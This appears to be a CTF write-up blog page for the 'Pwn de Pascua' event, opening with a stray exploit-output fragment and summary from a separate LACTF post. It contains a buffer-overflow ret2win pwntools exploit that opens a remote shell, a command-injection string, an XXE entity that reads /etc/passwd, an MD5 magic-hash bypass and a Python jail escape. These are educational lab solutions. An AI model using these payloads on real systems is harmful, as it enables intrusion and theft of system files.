$ python3 canary.py Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No [+] Opening connection to box.acmcyber.com on port 31123: Done [*] Canary found: 0xd926b28a61c3ed00 [*] Switching to interactive mode \x01, i'm aplet123 smh $ bye bye lactf{so_untrue_ei2p1wfwh9np2gg6} [*] Got EOF while reading in interactive
summary: pwn challenge of LACTF2024 where we must exfiltrate the canary + ret2win
title: aplet123 - pwn

content:
In this post I will share the solutions to the challenges I solved in the “Pwn de pascua” CTF, played on December 20, 2024. I am pleased to announce that I got the first place in this event, which fills me with satisfaction and motivation.
Below, I will explain the approaches and techniques I used to solve each of the challenges presented.
principiante AprendeRE We are given a binary that we must reverse, analyzing its functions we see that the function check_password() performs an xor with the string wl]qkorng]PG##=#, by performing the reverse we can get the password and solve the challenge.
target = "wl]qkorng]PG##=#" password = ''.join(chr(ord(char) ^ 2) for char in target) print(password) When we execute it we obtain the password that corresponds to the flag.
$ python3 solve.py un_simple_RE!!?! ret2pwn This challenge is the typical ret2win challenge, we are given a binary vulnerable to Buffer Overflow with a win() function which returns a shell. The binary in its main() function calls the vuln() function.
gef➤ disass main Dump of assembler code for function main: 0x0000000000401240 <+0>:	endbr64 0x0000000000401244 <+4>:	push rbp 0x0000000000401245 <+5>:	mov rbp,rsp 0x0000000000401248 <+8>:	mov eax,0x0 0x000000000040124d <+13>:	call 0x401196 <setup> 0x0000000000401252 <+18>:	mov eax,0x0 0x0000000000401257 <+23>:	call 0x4011f7 <vuln> 0x000000000040125c <+28>:	mov eax,0x0 0x0000000000401261 <+33>:	pop rbp 0x0000000000401262 <+34>:	ret End of assembler dump. The vuln() function is vulnerable to Buffer Overflow since it defines a buffer of 256 bytes in size and reads up to 512 bytes, giving us room to overflow the stack.
gef➤ disass vuln Dump of assembler code for function vuln: 0x00000000004011f7 <+0>:	endbr64 0x00000000004011fb <+4>:	push rbp 0x00000000004011fc <+5>:	mov rbp,rsp 0x00000000004011ff <+8>:	sub rsp,0x100 0x0000000000401206 <+15>:	lea rax,[rip+0xdff] # 0x40200c 0x000000000040120d <+22>:	mov rdi,rax 0x0000000000401210 <+25>:	call 0x401070 <puts@plt> 0x0000000000401215 <+30>:	lea rax,[rbp-0x100] 0x000000000040121c <+37>:	mov edx,0x200 0x0000000000401221 <+42>:	mov rsi,rax 0x0000000000401224 <+45>:	mov edi,0x0 0x0000000000401229 <+50>:	call 0x401090 <read@plt> 0x000000000040122e <+55>:	lea rax,[rip+0xde3] # 0x402018 0x0000000000401235 <+62>:	mov rdi,rax 0x0000000000401238 <+65>:	call 0x401070 <puts@plt> 0x000000000040123d <+70>:	nop 0x000000000040123e <+71>:	leave 0x000000000040123f <+72>:	ret End of assembler dump. To sum up:
We must exploit the Buffer Overflow until we overflow the stack. Once the stack is overflowed we must align the stack with a RET gadget (we use ROPgadget for this). We pass the memory address of the win() function and get a shell. With this exploit we solve the challenge.
from pwn import * p = remote('0.cloud.chals.io', 23438) offset = 264 junk = b'A' * offset payload = junk # padding payload += p64(0x000000000040101a) # ret payload += p64(0x00000000004011dd) # win() p.sendline(payload) p.interactive() When executed, it returns a shell.
$ python3 solve.py [+] Opening connection to 0.cloud.chals.io on port 23438: Done [*] Switching to interactive mode A donde? : ok, let's go! $ ls flag.txt ret2pwn $ cat flag.txt q4{un_simple_ret2pwn_para_apr3nder!} Just Decode it! We are given a string encoded in base64, we decode it and see that it is in hexadecimal, decode it again and get the flag, use Cyberchef for this.
Borrado The description of the challenge is as follows.
Anoche me tome unos tragos y quede borrado, ayudame a recuperar mi memoria. Si quieres aprender a resolver retos de tipo Forense, este challenge es un buen comienzo para ti! We are given an .img and when doing a strings you can see the flag.
$ strings challenge.img ... ... ... q4{l0_borrado_nunca_esta_borrado} Alive Web challenge, command injection with the typical ;+cat+/flag.txt.
web Al choque! We were given the source code of the application.
<?php include("flag.php"); if (isset($_GET['secret'])) { if (md5($_GET['secret']) == '0e830400451993494058024219903391') { print($flag); exit; } } else { print("No hay flags aca!"); exit; } ?> We see that it includes the file flag.php which contains the flag, then with an if statement it validates if the secret that we enter encrypted to MD5 is equal to 0e830400451993494058024219903391, if this is fulfilled it returns the flag, if not it gives us an error. Searching in Google I realized that the hash 0e83040045451993494058024219903391 was the string QNKCDZO, so with that I could solve the challenge.
$ curl -X GET https://q4-alchoque.chals.io/\?secret\=QNKCDZO q4{super_f4c1l_gg_compar1s0n_webwebweb} El_Fr33st4lero This challenge was one of the ones I liked the most! I spent a lot of time trying to solve it.
When entering we could see a video of the glorious Matiah Chinaski rapping, when we saw the source code we saw a string that caught my attention //cat, also the video was called cat.mp4 so I felt it had to do something with animals. Since I did not find anything I decided to do fuzzing using wfuzz with animal names and extensions, with this command I found the file gato.html.
wfuzz -c -t 50 -u https://q4-el-fr33st4lero.chals.io/FUZZFUZ2Z -z file,animales.txt -z file,File-Extensions-Wordlist.txt --hc=404,403 When entering the file we saw a registration form.
When filling the form and intercepting the request we see that the data is processed in XML, I automatically knew that this was an XXE so I injected the typical DOCTYPE and I could read files.
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]> Then I was wasting a lot of time looking for the flag, until it occurred to me to look in /etc/ and sure enough, there it was!
crypto babycrypto We receive the encrypted flag and the source code that encrypts it.
from flag import FLAG def enc(plaintext): message = "" for i, char in enumerate(plaintext): if char.isalpha(): if char.isupper(): shifted = (ord(char) - ord('A') + i) % 26 message += chr(shifted + ord('A')) elif char.islower(): shifted = (ord(char) - ord('a') + i) % 26 message += chr(shifted + ord('a')) else: message += char return message message = enc(FLAG) # Write the encrypted FLAG to an output file with open("message.txt", "w") as f: f.write(message) Define an enc() function which encrypts the message using the typical cesar modulo 26 cipher, just write the inverse and the challenge can be solved.
def dec(ciphertext): plaintext = "" for i, char in enumerate(ciphertext): if char.isalpha(): if char.isupper(): shifted = (ord(char) - ord('A') - i) % 26 plaintext += chr(shifted + ord('A')) elif char.islower(): shifted = (ord(char) - ord('a') - i) % 26 plaintext += chr(shifted + ord('a')) else: plaintext += char return plaintext ciphertext = "uo_vq4rs_lbjbgc_frjt_knbnzrbt_IQ_WXAYIUZC_G4" flag = dec(ciphertext) print(flag) When we executed it, we obtained the flag in plain text.
$ python3 solve.py un_sm4ll_crypto_para_preparar_EL_PPROXIMO_Q4 miniCrypto This challenge was a vulnerable RSA implementation, since the prime number $q$ was generated in an insecure way and this allowed that by means of Fermat Factorization we could factor $n$ and break the whole cryptosystem. This is the implementation of Fermat Factorization in Python.
def isqrt(n): x=n y=(x+n//x)//2 while(y<x): x=y y=(x+n//x)//2 return x def fermat(n): t0=isqrt(n)+1 counter=0 t=t0+counter temp=isqrt((t*t)-n) while((temp*temp)!=((t*t)-n)): counter+=1 t=t0+counter temp=isqrt((t*t)-n) s=temp p=t+s q=t-s return p,q When factoring $n$ it is only necessary to do the typical RSA calculations.
from Crypto.Util.number import * p =  q =  n = p * q e = 0x10001 phi = (p - 1) * (q - 1) d = inverse(e, phi) c =  print(long_to_bytes(pow(c, d, n))) When we execute it we obtain the flag.
$ python3 solve2.py b'q4{un_p0c0_s0l0_un_p0c0_de_RSA!}' forense Volando We get a .mem file, using volatily3 we dumpe the processes and we see that there is a string in hexadecimal, we decode it and get the flag.
$ python vol.py -f ../q4/memdump.mem windows.cmdline 7456 smartscreen.ex C:\Windows\System32\smartscreen.exe -Embedding 6448 q4_mal.exe "C:\Users\user01\Desktop\q4_mal.exe" 6452 conhost.exe ??\C:\Windows\system32\conhost.exe 0x4 4812 71347B616C676F "C:\Users\user01\Documents\71347B616C676F5F616E616C317331735F703472345F656C5F6D656D64756D707D.exe" 8136 SearchProtocol "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe4_ Global\UsGthrCtrlFltPipeMssGthrPipe4 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" 5608 SearchFilterHo "C:\Windows\system32\SearchFilterHost.exe" 0 828 832 840 8192 836 820 >>> bytes.fromhex("71347B616C676F5F616E616C317331735F703472345F656C5F6D656D64756D707D") b'q4{algo_anal1s1s_p4r4_el_memdump}' jail La Cana We must escape from a Python jail, it gives us the source code and the remote instance to connect to.
#!/usr/bin/env python3 import sys def check(n, a): if n not in ["exec", "compile", "builtins.input", "builtins.input/result"]: print(f"nah! {n} y {a} prohibidos!") print("Chao no mas!") exit(0) sys.addaudithook(check) while True: try: c = input("> ") exec(c) except Exception as e: print("Error!") exit(0) The source code looked familiar to me since I had solved a similar challenge in ImaginaryCTF some time ago, but the strange thing is that the payload didn’t work because the exit() function of Python gave me an error, looking for it I found this https://spclr.ch/imaginaryctf-round-11-writeup and I could solve the challenge.
nc 0.cloud.chals.io 32199 > exit=lambda x: x > import os > os.system("cat flag.txt") q4{3scape_de_la_carcel_de_la_vibor4} nah! os.system y (b'cat flag.txt',) prohibidos! Chao no mas! In closing, I want to emphasize that the CTF challenges were excellent and I really enjoyed the experience. I am very satisfied with the level of difficulty and the quality of the challenges. I am certainly looking forward to the next Q4 in March.
summary: Writeups of the CTF “Pwn de Pascua” challenges organized by Q4 Hacking Sessions
title: PWN de Pascua Writeups
